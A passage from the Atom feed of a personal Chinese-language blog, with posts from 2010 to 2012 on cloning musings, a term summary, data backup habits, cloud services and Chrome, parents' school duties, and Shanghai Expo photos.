<p>因为你是唯一的，心中在激动后不能接受。</p>
<p>很多东西不唯一也就失去意义了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>开始由一些奇怪的话题写一下自己的妄想。</p>
<p>【克隆】<br>报纸上的姐妹花考到相同的分，人们习惯以双胞胎的心灵感应来解释。不过似乎没有一种可靠的解释来说明或应用，不过如果能有那是很好。</p>
<p>以前讲到克隆技术，我一般都很兴奋。克隆是一个旧的概念，原意是复制]]>
    </summary>
    
      <category term="delusion" scheme="http://yqf3139.github.io/categories/delusion/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[所谓的小结]]></title>
    <link href="http://yqf3139.github.io/2012/01/11/a-summary-2012/"/>
    <id>http://yqf3139.github.io/2012/01/11/a-summary-2012/</id>
    <published>2012-01-11T10:06:00.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>整理evernote时发现了这次期末老师让我们写的小结，那天睡前花了15分钟随便扯了一点自己的思维片段出来。以后慢慢整理，先贴这里。的确生活中有很多零星的想法，以后有时间一定要写周记。</p>
<p>应该说这学期繁忙而又平淡,感觉没做什么贡献,也谈不上有什么成绩.高三时总会想”我现在做的事情有什么意义”,似乎肯定有人要说现代教育的种种缺点,我觉得都有道理.当然在我所说的一个历史背景下,有些事情暂时还很难改变,于是我发现高考以及在它引领下的绝大多数人的教育,还是有一点用处的,至少它将中国国情摆在这儿,并让我们做出选择,让我们适应,并可能在日后去改变它.</p>
<p>今后都要走上社会,高考这个产物便是我们做出选择与适应国情的一次机会,有的人怎么样,有的人又怎么样,当然,出国也是一种不错的选择.</p>
<p>选择是个很有趣的词.一个选择包含的信息无法估计.没有正确的或是错误的选择,但又的确有区分.我发现它们都是你的投影.也别后悔做出的选择,正是它使你与众不同.只要接下来的事情都一步步做好,的确回头看时,没有正确与错误之辩了.</p>
<p>同时我们还是应该要在自己的理解范围内,去尊重他人的选择,因为熵增是一个必然的诉求.<br>不同的环境是自然熵增的结果,人也一样要与众不同.这便可以解释很多人类社会中奇奇怪怪的事情.不过人世间的熵减我还没想明白.想到这里,对于很多事情便可以释然,你大可不必对某人某事说忍受不了,成人之美让他熵增.不过不同的人有不同的选择,也有不同的社会期望.我如果是他的老师,就也许要批评教育他,或是引导他.一切又看你的选择,而这个选择由谁决定的?还不得而知.</p>
<p>你心中的其他人的形象很大程度是你自己.我们活在一种期望中.</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>整理evernote时发现了这次期末老师让我们写的小结，那天睡前花了15分钟随便扯了一点自己的思维片段出来。以后慢慢整理，先贴这里。的确生活中有很多零星的想法，以后有时间一定要写周记。</p>
<p>应该说这学期繁忙而又平淡,感觉没做什么贡献,也谈不上有什么成绩.高三时总会]]>
    </summary>
    
      <category term="flood" scheme="http://yqf3139.github.io/categories/flood/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[数据意识]]></title>
    <link href="http://yqf3139.github.io/2011/07/12/consciousness-of-data/"/>
    <id>http://yqf3139.github.io/2011/07/12/consciousness-of-data/</id>
    <published>2011-07-12T13:06:00.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>还是经常会看到有同学在网上抱怨手机偷了电话号码没了，电脑不行了以前的数据找不到了。由于各种各样的原因，我们会经常找不到我们以前的东西，数据这个东西也是如此。<br>在这个快速发展的社会，有时一小包数据可能改变一个公司一个人的命运。那是往大了说，但从小方面来说，数据的整理与保护已经成为一个很重要的技能，它能使你的生活工作效率翻倍，在有些时候可以剩下很多没必要的劳累。<br>比如说我现在在写东西，网络会帮我定时保存，拿word客户端也会这样，不过有时也会出差错。怎么才能完全保护数据的安全呢？我们需要想清可能发生的几乎所有极端情况。<br>手机上有很多数据，联系人，短消息，各种笔记日历图片视频等等，手机一丢就和他们说再见？然后买新的慢慢敲联系人？我几乎没这耐心。<br>对我来说，我是没有这种忧虑的，首先我没手机，我能用的就是爸妈的手机，这让我更关注我数据的安全。联系人都是在网盘邮箱与同步软件中备份的，笔记图片录音直接上传到evernote，doitim就是我的日历与计划表，并每月备份到更安全的网盘，电脑与硬盘。我没理由丢失这部分数据。<br>电脑上更是如此。吸取的google和mac的价值观后，我的桌面就是我的工作台，上面就是一个回收站和最近使用的数据，用过的都放入快盘备份，我在每台机子的数据也几乎都在快盘中，只有一些软件的偏好设置和用户数据由软件自己云备份，几乎能导出的数据都备份了。快盘上活跃的1.7G数据与T盘上备份的20G数据让我不会丢失数据，同样他们会自动的备份到云端，在我家两台pc间同步，并定期进入外挂盘备份。</p>
<p>上面说的是数据的<code>保护</code>意识，接下来也就是数据的<code>采集</code>意识了。</p>
<p>我们知道，现实生活中的东西不好整理与查找，而数据却易于管理与调阅。建立强大的数据库有利于你今后的发展。<br>自己的文档，查找的资料，浏览器的书签与扩展，拍的照片视频还有录音等，都是可被保存的。我甚至以后要将我有用的各种实物数字化保存，方便查阅及时以后他们不在我的身边。数据就是一小包代码，多一点无害处，且你不知会在什么时候用到他们，比如ckk要全班人的联系方式，我就想起我从一次班级文件中截获整理的所有人的电话，不用课代表一个个去问，而只是几秒钟的事。</p>
<p>除了数据的保护与采集意识，数据的可获取性和共享性也是我很兴奋与关注的。这也是我为什么所有数据都在云上有备份，并经常共享图片与课件还有一些数据到群上。可随时获取并共享的数据才更有价值和活力。</p>
<p>现在，我可以说这么一句话，<code>我不会失去原始与加工的数据，我所失去的只会是几个副本和他们存在的形式与顺序</code>。<br>数据意识的重要性，我想在未来，会越来越多的影响我们，</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>还是经常会看到有同学在网上抱怨手机偷了电话号码没了，电脑不行了以前的数据找不到了。由于各种各样的原因，我们会经常找不到我们以前的东西，数据这个东西也是如此。<br>在这个快速发展的社会，有时一小包数据可能改变一个公司一个人的命运。那是往大了说，但从小方面来说，数据的整理与保]]>
    </summary>
    
      <category term="data" scheme="http://yqf3139.github.io/tags/data/"/>
    
      <category term="techtalk" scheme="http://yqf3139.github.io/categories/techtalk/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[那朵云]]></title>
    <link href="http://yqf3139.github.io/2011/02/02/the-cloud-2011/"/>
    <id>http://yqf3139.github.io/2011/02/02/the-cloud-2011/</id>
    <published>2011-02-02T02:53:00.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这是我在2011年春节时写的三篇博客，现在整理如下。当时站在纯使用者的角度，对Web技术、浏览器和<br>  云服务产生了极大的研究兴趣。推崇Chrome OS这个点子。</p>
</blockquote>
<h2 id="Day_1"><a href="#Day_1" class="headerlink" title="Day 1"></a>Day 1</h2><p>写些什么呢，最近很长时间没写东西了，不过最近见识了很多有意思的东西，所以准备写些下来分享一下。</p>
<p>为了体现云的特点，我将于三十，初一，初二，在三台电脑上完成这组日志，每天写一些，输入法以及图都将来自云端。</p>
<p>那就开始吧。</p>
<p>首先从我认为的云的三个方面说起，我想大概可以分成云服务，云计算，云存储，就从最大的云服务开始说起。</p>
<p>其实你可以想想，你每天上网是在干什么，你开机，等上一两分钟，然后打开浏览器上网，你可以看视频，织围脖，玩社交网站，搜索信息，玩在线小游戏等等，在你电脑里的浏览器便成了你最长面对一个软件，他可以很强大，强大的超过你的想象。大多数中国的网民都是用IE，多上网的用火狐，用apple的会用safari，当然我也试过opera等一堆浏览器，不过chrome彻底改变了我对浏览器的想法。</p>
<p>我问你浏览器可以干什么，你或许会说他可以干以上的事情，其实它可以做的更多，甚至他可以做一切你在其他软件上做的事，让我来展示一下。</p>
<p>比如说在线处理文档，wordppt什么的，我们一直都是打开office然后开始工作，程序文件存档都保存在客户这里，如果你没装office，如果你的文件丢失，那么你都无法进行工作。不过如果你有一个浏览器，有个网速不错的互联网，那你只要打开个网页你就能做到。</p>
<p><img src="/images/the-cloud-2011/1.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/2.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/3.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/4.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/5.png" alt="Web"><br>比如说这个googledocs，在墙内访问还有很大困难，不过他彻底颠覆了office，你输入了几个字，网站会立即帮你保存，你可以与其他人分享文档，或一起写一份文档。</p>
<p><img src="/images/the-cloud-2011/6.png" alt="Web"></p>
<p>在线的相册，这个我们大家都用过</p>
<p>你也可以娱乐一下，玩些游戏<br><img src="/images/the-cloud-2011/7.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/8.png" alt="Web"></p>
<p>或者做些很cool的事情</p>
<p><img src="/images/the-cloud-2011/9.png" alt="Web"></p>
<p>google的在线人体浏览</p>
<p><img src="/images/the-cloud-2011/10.png" alt="Web"></p>
<p>这些都在你的Chrome Apps中<br><img src="/images/the-cloud-2011/11.png" alt="Web"></p>
<p>其实更强大的在扩展程序中，</p>
<p>这个浏览器起始页码，功能很多<br><img src="/images/the-cloud-2011/12.png" alt="Web"><br>read later<br><img src="/images/the-cloud-2011/13.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/14.png" alt="Web"><br>让我随时知道室外的温度与湿度<br><img src="/images/the-cloud-2011/15.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/16.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/17.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/18.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/19.png" alt="Web"><br>直接可以通过扩展程序看地球<br><img src="/images/the-cloud-2011/20.png" alt="Web"><br>告诉你每个网站的地址信息<br><img src="/images/the-cloud-2011/21.png" alt="Web"></p>
<p>小窗口弹出<br><img src="/images/the-cloud-2011/22.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/23.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/24.png" alt="Web"></p>
<p>在线播放器<br><img src="/images/the-cloud-2011/25.png" alt="Web"></p>
<p>他还能做什么，我不知道，我只知道他能做的不止于此，它可以几乎取代你的操作系统，他可以让你在短时间内完成几台电脑的书签与apps，偏好同步，还有密码，the same experience every where,就是这样。</p>
<p>以后Chrome OS会取代视窗么，也许吧，在下面我要来介绍更近一步的服务，一个完全基于网页的os</p>
<p>Webqq 2.0</p>
<p><img src="/images/the-cloud-2011/26.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/27.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/28.png" alt="Web"></p>
<p>在线读杂志<br><img src="/images/the-cloud-2011/29.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/30.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/31.png" alt="Web"></p>
<p>也就是说你只要登录，不论你用什么电脑，什么浏览器，你都能得到the same experience every where。</p>
<p>从这方面来讲，chrome将你的系统搬到了浏览器上，webqq2将他搬到了网页上，这一切都是基于网速，</p>
<p>那么我可以大胆的想象一下，当网速达到一定程度时，我可以把你的电脑搬到云端，只给你留下屏幕等交互的硬件。</p>
<p><img src="/images/the-cloud-2011/32.png" alt="Web"></p>
<p><img src="/images/the-cloud-2011/33.png" alt="Web"></p>
<h2 id="Day_2"><a href="#Day_2" class="headerlink" title="Day 2"></a>Day 2</h2><p>今天不过只是在我家另一台电脑的我爸的账号里，他用的也是chrome10。我输入web2.qq.com，并快速开始今天的文章。</p>
<p>今天我随便说说我对云计算和云存储的理解。</p>
<p>其实昨天说的云服务都是基于云计算和存储，不过他们一般消耗资源不是很大。昨天我翻订约时，我哥在一旁指着关于甲骨文云计算的文章问我什么是云计算，我说大概就是把本来给你要计算的内容发到云上的服务器上，再快速返回给你结果，我们自身并不需消耗过多的资源。这和搜索是一回事，不过搜索引擎的数据库是在他那，我给他关键词，他运算后返给结果。</p>
<p>云计算可以是群组内的协作，像双核或四核电脑一样，一个庞大的任务，统一分配给电脑们，再收上结果来汇总，这对于网吧和机房来说就可以干很多大型计算机干的事。云计算也可以是像前面一样的单个电脑的访问，让主要运算跑在服务器上，自身轻松干大事。比如说我前些日子看了个视频，一个android上直接玩魔兽世界，不要觉得不可能，用云计算轻松做到，前提是网速要高，并有那样的服务器，说实话，云计算可以让高配机与顶配机没有区别，让我那台可怜的03年出产的二手小机跑点他以前一跑就死机的程序，这一切以后会实现的。到那时，你的配置有多高也许没什么意义。你家的未来的androidTV可以干所有的事。</p>
<p>云存储很简单，我现在打的文字，上传的照片视频，都是在云端，这一切是为了不会有数据丢失，也是为了方便提取。云存储的制约因素还是网络，我哥有同学费劲地把视频往touch中倒，看完再删，如果网速可以的话，我完全可以随时随地看任何视频，可以看一段缓存删掉，那谁还在乎你是多少个G的touch呢，现在电脑动不动就是300多个g的硬盘，我说我的电脑可以有好几个T，近些天金山出了T盘，我很快把我的一个g的资料与精选图片的压缩传穿了上去，我还准备把我的以前的资料数字化后传上去保存，以后随时可以提取使用。传图基本是秒下，传3m的ppt也是很快，那我可以说有网的地方我就带了一个1t的硬盘，真的那时谁还在乎你是多少g硬盘的电脑呢？当然前提是网速好和隐私不泄密。</p>
<p>云存储和云计算都无限地扩大了我们电脑和智能移动设备的性能，只要以后网速够，你再有一个较好的操作系统和浏览器，还有什么不能做呢？</p>
<p>明天我来写写信息的聚合吧。</p>
<h2 id="Day_3"><a href="#Day_3" class="headerlink" title="Day 3"></a>Day 3</h2><p>今天是在外婆家的电脑上，电脑的配置很不错。我很快下好了最新版的chromium，设置帐号同步。大概在5分钟，我的书签以及偏好配置就已经下来了，因为chromium可以同步密码，我打开空间开始写今天的文章。</p>
<p>拿我来说，每天打开电脑第一时间就打开阅读空间和微博的特别收听，大概花十分钟处理一下我的订阅。这些信息都是我所关注的，所以效率较高。这就是快速聚合的力量。</p>
<p>我们上网，浏览与搜集我们需要与感兴趣的信息，一开始大概是浏览博客。不同博主所关注的方面不同，而我们只需关注他们就可以得到我们想要的最新的信息，但每次去打开书签十分繁琐，所以就出现了rss订阅，每天只要打开订阅器，就很快知道他们进行了什么更新。他将我获得资讯的速度上升为几个小时，不过局限也是有的。不能评论，不方便与其他人讨论，而且有的博文太长，不适合现在快节奏的生活方式–快速的获得资讯。不过他与微博相比有更大的灵活性，不受是哪家提供商的制约，也方便导出订阅，可以在googlereader中看，也可以在阅读空间中看。</p>
<p>那微博怎么就出现了呢，首先140字，保证了信息的简明精炼，还有图片视频链接很生动，第二它本身就是一个很高效的信息聚合器，通过收听不同的人，很容易获得自己想要的信息。他方便评论交流，与他人的互动。使我们与名人之间的距离大大缩小。在这里我想说，微博对于我们普通大众来说作为信息聚合器的作用更大于信息发布器，他更适用于评论与交流。而晒心情什么的，还是留给sns吧。</p>
<p>sns什么的我在这就不多说了，其本质与微博基本相同，不过交流的人群不一样，有一部分的交集。（刚才电源被刚上小学的弟弟拔了，亏了云，我流失的数据不多。）</p>
<p>在这里我还是看好腾讯微博，因为微博流量大，但盈利空间不大，没有太大资金支持的新浪可能暂时不占优势。</p>
<p>总之，如何把信息更好地聚合给需要的人是rss与微博致力于的事，而如何不让人们看到他们不该看的事，看来是和谐的事，不过这一直是件难事。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这是我在2011年春节时写的三篇博客，现在整理如下。当时站在纯使用者的角度，对Web技术、浏览器和<br>  云服务产生了极大的研究兴趣。推崇Chrome OS这个点子。</p>
</blockquote>
<h2 id="Day_1"><a hr]]>
    </summary>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="cloud" scheme="http://yqf3139.github.io/tags/cloud/"/>
    
      <category term="techtalk" scheme="http://yqf3139.github.io/categories/techtalk/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[开学]]></title>
    <link href="http://yqf3139.github.io/2010/08/31/term-begins/"/>
    <id>http://yqf3139.github.io/2010/08/31/term-begins/</id>
    <published>2010-08-31T07:00:00.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>我准备开学，豆子准备入学，即将成为小学生的他异常兴奋，甚至于想当班长想到跌跤擦破了手臂，我说到了高中每人会想当班长，我妈建议他从小组长做起，他还是勉强地答应了。<br>带他去我家玩，并捎小姨去地铁站。我们两家本来只相距3分钟车程，现在为了他的小学，他们需要去住城里的70平米的老房了。<br>车刚开出不远，小姨就接了电话。<br>“喂，张老师，对我是他的妈妈，你好，嗯，有什么事么，哦，好，行，那我去买吧，不不，我全买了，那个桌布是大概，嗯10张一包，我买6包可以吗，嗯好好，还有什么需要的么，报纸没事我带些来，行，那还有什么需要我们做的吗？没事不客气，那好好诶再见。”<br>“什么事啊？”我妈问，“他们开学，要桌布报纸布置现场，小朋友要做文化衫什么的，我们家还没报纸。”小姨改了热情的语调，若有所思地说。“我们家有报纸。让他回去时带着吧。”<br>报道后，我爸拿着报纸回家，说“老师发个短信，家长就去大扫除了。家长不容易啊。”我接过报纸，细细读着。</p>
<p>想起以前读过的文章，莫小米《鞭长莫及》</p>
<blockquote>
<p>去年底，接到朋友电话，不像平时的从容聊天，那个电话是心急火燎的。她说你在媒体工作多年，新华社有关系吗？我说分社有一点儿。<br>  总社呢？没有。<br>  外交部有关系吗？没有。<br>  哎呀呀，愁死人了。<br>  问清原委，原来是大好事。她的孩子硕士毕业，报考外交部，接到面试通知了；报考新华社，也接到面试通知了。<br>  我说恭喜恭喜，女儿多优秀啊，人家家长羡慕还来不及。<br>  她说羡慕什么啊，接下来的面试、试用期，淘汰比率仍然很高，上去的人肯定关系铁硬……唉唉，北京，一点都够不着，我亲戚朋友熟人电话打一圈了。还有，你估估看哪里把握大些，我们着重做工作，扎牢一头，可不要两头脱空。<br>  到了今年1月，快过年时，朋友忧心忡忡的电话又来了：新华社有一点希望，但不能敲定；外交部一点信息没有，关系也找不到。你看怎么办？<br>  看来，这个年她也过不好了，我拼命宽慰也不管用。<br>  朋友是劳碌命。女儿从小到大的学习，都是她一手操办。女儿上幼儿园时她就帮老师的孩子织过毛衣，为此特意学来别致的花样。女儿升小学、升中学、包括高考，她都进行全方位考察，提前挑选学校、班级，拜托相关人士，建立良好关系。<br>  过节送点东西那是小儿科，她是用心良苦的，曾帮助老师办过护照、打过官司、装修过房子……这样实打实地做过她才心安。<br>  她的女儿果然步步顺利，学业优秀，各方面都很出色，她觉得，一切都是自己铺垫的结果。<br>  而现在，她总觉得该做点什么，不能听天由命，可这次鞭长莫及了。<br>  春节过后不久，她女儿打来电话：阿姨，两边都录取了，我准备去外交部。<br>  又说：幸亏这次妈妈没有托到关系，其实每次我都跟她讲不用这样做，她从来一意孤行。我总算有个机会来证明我自己了。），<br>  想起看过的小品，蔡明郭达的《送礼》。</p>
</blockquote>
<p>里面的家长为了孩子花样百出以给老师以好印象，以为孩子的成功是自己一手铺垫的，其实到头来没有太多帮助，反而可能被人误解。<br>现在老师直接发令，家长自然乐意效劳，老师也并不担心，因为一定有家长会效力，为了孩子家长开始做很多以前家长从未做过的事，比如打扫卫生，采购，或者利用人脉做些什么事。打扫卫生不够，校领导还要检查评比，那学校不出清洁员，又怕累着老师，伤到孩子，那到底是在比谁呢，是比哪个班的家长会做事，是听话的好孩子？<br>不管怎么说，家长这么做都是在意孩子的表现，现在在我房间胡闹的豆子也许还不懂，我想我妈说的有些话是对的。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我准备开学，豆子准备入学，即将成为小学生的他异常兴奋，甚至于想当班长想到跌跤擦破了手臂，我说到了高中每人会想当班长，我妈建议他从小组长做起，他还是勉强地答应了。<br>带他去我家玩，并捎小姨去地铁站。我们两家本来只相距3分钟车程，现在为了他的小学，他们需要去住城里的70平米]]>
    </summary>
    
      <category term="flood" scheme="http://yqf3139.github.io/categories/flood/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[世博之人]]></title>
    <link href="http://yqf3139.github.io/2010/07/29/expo-people/"/>
    <id>http://yqf3139.github.io/2010/07/29/expo-people/</id>
    <published>2010-07-29T02:17:00.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>下面是有趣的人：</p>
<p><img src="/images/expo-people/1.jpg" alt="Expo"><br>我随手丢包里的小螺丝刀，就这样被和谐了，意外之喜是裸眼拍到了这么好的图<br><img src="/images/expo-people/2.jpg" alt="Expo"><br>买的是集邮册<br><img src="/images/expo-people/3.jpg" alt="Expo"><br>看表演的人真多<br><img src="/images/expo-people/4.jpg" alt="Expo"><br>新西兰馆外的玉石<br><img src="/images/expo-people/5.jpg" alt="Expo"><br>没有护照，没关系，直接敲手臂上<br><img src="/images/expo-people/6.jpg" alt="Expo"><br>黑人小伙<br><img src="/images/expo-people/7.jpg" alt="Expo"><br>意大利馆内现场制鞋的师傅<br><img src="/images/expo-people/8.jpg" alt="Expo"><br>脸上笑容流光<br><img src="/images/expo-people/9.jpg" alt="Expo"><br>看看老外吃什么<br><img src="/images/expo-people/10.jpg" alt="Expo"><br>午休的小男孩<br><img src="/images/expo-people/11.jpg" alt="Expo"><br>意大利的巨大穹顶<br><img src="/images/expo-people/12.jpg" alt="Expo"><br>德国馆排队期间，多亏有这个德国帅哥<br><img src="/images/expo-people/13.jpg" alt="Expo"><br>还有一个<br><img src="/images/expo-people/14.jpg" alt="Expo"><br>法国帅哥记者不忘发型<br><img src="/images/expo-people/15.jpg" alt="Expo"></p>
<p><img src="/images/expo-people/16.jpg" alt="Expo"></p>
<p><img src="/images/expo-people/17.jpg" alt="Expo"><br>模拟驾驶<br><img src="/images/expo-people/18.jpg" alt="Expo"><br>一位铁路老员工的肺腑之言<br><img src="/images/expo-people/19.jpg" alt="Expo"></p>
<p><img src="/images/expo-people/20.jpg" alt="Expo"><br>单车表演<br><img src="/images/expo-people/21.jpg" alt="Expo"><br>韩国企业馆的互动大屏幕<br><img src="/images/expo-people/22.jpg" alt="Expo"><br>国家电网馆下密密麻麻的人群<br><img src="/images/expo-people/23.jpg" alt="Expo"></p>
<p><img src="/images/expo-people/24.jpg" alt="Expo"></p>
<p><img src="/images/expo-people/25.jpg" alt="Expo"><br>小女孩被吓了一跳<br><img src="/images/expo-people/26.jpg" alt="Expo"></p>
<p><img src="/images/expo-people/27.jpg" alt="Expo"></p>
<p><img src="/images/expo-people/28.jpg" alt="Expo"><br>丹麦上的喷泉，小朋友玩的很开心</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>下面是有趣的人：</p>
<p><img src="/images/expo-people/1.jpg" alt="Expo"><br>我随手丢包里的小螺丝刀，就这样被和谐了，意外之喜是裸眼拍到了这么好的图<br><img src="/images/expo-people/]]>
    </summary>
    
      <category term="photography" scheme="http://yqf3139.github.io/tags/photography/"/>
    
      <category term="travel" scheme="http://yqf3139.github.io/categories/travel/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[世博之景]]></title>
    <link href="http://yqf3139.github.io/2010/07/29/expo-scene/"/>
    <id>http://yqf3139.github.io/2010/07/29/expo-scene/</id>
    <published>2010-07-29T01:52:00.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>世博才两天半就回来了，真是有些意犹未尽。平均睡眠6小时，不按时吃饭(除了早餐)，除了排队就是看馆还有我妈辛勤的敲章。除了和我哥确立了每年7月26号为脚掌受难日，默哀3分钟外，世博也没把我怎么样。看了大大小小不少场馆，每天过目的人也有几万人吧。</p>
<p>看了非洲联合馆，美国馆，意大利馆，法国馆，德国馆，卢森堡，荷兰，丹麦，芬兰，捷克，斯洛伐克，葡萄牙，白俄罗斯，泰国，澳大利亚，新加坡，新西兰，世博轴，尼泊尔，以色列，黎巴嫩，伊朗，朝鲜，亚洲联合，日本，日本产业，韩国产业，国家电网，太空家园，中国铁路，远大馆，案例馆也看了一个，不关怎么说，算是走马观花都绕了一遍。当然，为了省时间，不拆的中国馆和耗时的沙特馆没去。</p>
<p>人是很多，干什么都要排队，聪明点的话，可以看得更多。</p>
<p>下面是景物：</p>
<p><img src="/images/expo-scene/1.jpg" alt="Expo"><br>入园时正值夕阳西下，风将国旗全带向一边<br><img src="/images/expo-scene/2.jpg" alt="Expo"><br>如果是早晨，这里就不会这么空了吧<br><img src="/images/expo-scene/3.jpg" alt="Expo"><br>东方之冠沐浴在夕阳余晖中<br><img src="/images/expo-scene/4.jpg" alt="Expo"><br>尼泊尔馆<br><img src="/images/expo-scene/5.jpg" alt="Expo"><br>古色古香的长廊<br><img src="/images/expo-scene/6.jpg" alt="Expo"><br>佛像上被人们装点<br><img src="/images/expo-scene/7.jpg" alt="Expo"><br><img src="/images/expo-scene/8.jpg" alt="Expo"><br>很精美，摇一摇会怎么样呢<br><img src="/images/expo-scene/9.jpg" alt="Expo"><br>韩国馆夜景很美<br><img src="/images/expo-scene/10.jpg" alt="Expo"><br>澳大利亚馆内的展示历史的漫画小人<br><img src="/images/expo-scene/11.jpg" alt="Expo"><br>澳大利亚内的剧场，可以看看<br><img src="/images/expo-scene/12.jpg" alt="Expo"><br>夜间的世博轴<br><img src="/images/expo-scene/13.jpg" alt="Expo"><br>意大利馆中简单的线条美<br><img src="/images/expo-scene/14.jpg" alt="Expo"><br>玻璃工艺<br><img src="/images/expo-scene/15.jpg" alt="Expo"><br>法拉利California<br><img src="/images/expo-scene/16.jpg" alt="Expo"><br>机器人在组装中国国旗拼图<br><img src="/images/expo-scene/17.jpg" alt="Expo"><br>把尖顶放在桂冠中，别有趣味，俯拍很有力量感，云中露出一洞蓝天<br><img src="/images/expo-scene/18.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/19.jpg" alt="Expo"><br>卢森堡的花园<br><img src="/images/expo-scene/20.jpg" alt="Expo"><br>荷兰馆的工作人员向下望着<br><img src="/images/expo-scene/21.jpg" alt="Expo"><br>英国馆中似有一个米字<br><img src="/images/expo-scene/22.jpg" alt="Expo"><br>法国园艺<br><img src="/images/expo-scene/23.jpg" alt="Expo"><br>乌云带来力量感<br><img src="/images/expo-scene/24.jpg" alt="Expo"><br>镜面效果，两个被连接的空间<br><img src="/images/expo-scene/25.jpg" alt="Expo"><br>法国馆中爱哭的小机器人<br><img src="/images/expo-scene/26.jpg" alt="Expo"><br>俄罗斯，没进去看<br><img src="/images/expo-scene/27.jpg" alt="Expo"><br>游园表演<br><img src="/images/expo-scene/28.jpg" alt="Expo"><br>德国动力之源<br><img src="/images/expo-scene/29.jpg" alt="Expo"><br>在呼喊中，球体开始摇晃<br><img src="/images/expo-scene/30.jpg" alt="Expo"><br>小美人鱼，未能一睹芳容<br><img src="/images/expo-scene/31.jpg" alt="Expo"><br>丹麦馆上的景色很美<br><img src="/images/expo-scene/32.jpg" alt="Expo"><br>流光溢彩的喷泉<br><img src="/images/expo-scene/33.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/34.jpg" alt="Expo"><br>我们就是动车去高铁回的<br><img src="/images/expo-scene/35.jpg" alt="Expo"><br>上海产业联合馆的大机器人<br><img src="/images/expo-scene/36.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/37.jpg" alt="Expo"><br>国家电网的如水般荡漾的外墙<br><img src="/images/expo-scene/38.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/39.jpg" alt="Expo"><br>韩国企业内的屏幕出了点小问题<br><img src="/images/expo-scene/40.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/41.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/42.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/43.jpg" alt="Expo"><br>大温度计<br><img src="/images/expo-scene/44.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/45.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/46.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/47.jpg" alt="Expo"><br>沙特馆你好，沙特馆再见<br><img src="/images/expo-scene/48.jpg" alt="Expo"><br>它的回答是，人人还是人<br><img src="/images/expo-scene/49.jpg" alt="Expo"><br>意大利馆内的雕塑<br><img src="/images/expo-scene/50.jpg" alt="Expo"></p>
<p><img src="/images/expo-scene/51.jpg" alt="Expo"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>世博才两天半就回来了，真是有些意犹未尽。平均睡眠6小时，不按时吃饭(除了早餐)，除了排队就是看馆还有我妈辛勤的敲章。除了和我哥确立了每年7月26号为脚掌受难日，默哀3分钟外，世博也没把我怎么样。看了大大小小不少场馆，每天过目的人也有几万人吧。</p>
<p>看了非洲联合馆，]]>
    </summary>
    
      <category term="photography" scheme="http://yqf3139.github.io/tags/photography/"/>
    
      <category term="travel" scheme="http://yqf3139.github.io/categories/travel/"/>
    
  </entry>
  
</feed>
